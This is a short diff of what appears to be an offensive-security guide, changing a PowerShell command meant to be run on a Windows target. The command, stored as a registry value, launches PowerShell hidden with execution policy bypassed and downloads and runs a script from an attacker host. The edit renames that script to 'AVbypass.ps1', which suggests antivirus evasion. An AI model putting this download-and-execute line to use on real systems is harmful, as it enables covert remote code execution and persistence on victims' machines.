@@ -29,5 +29,5 @@ python3 -m http.server 80
 Then you can use this command within the Windows target system:
 
 ```
-$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/script.ps1'); Invoke-Function"
+$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/AVbypass.ps1'); Invoke-Function"
 ```
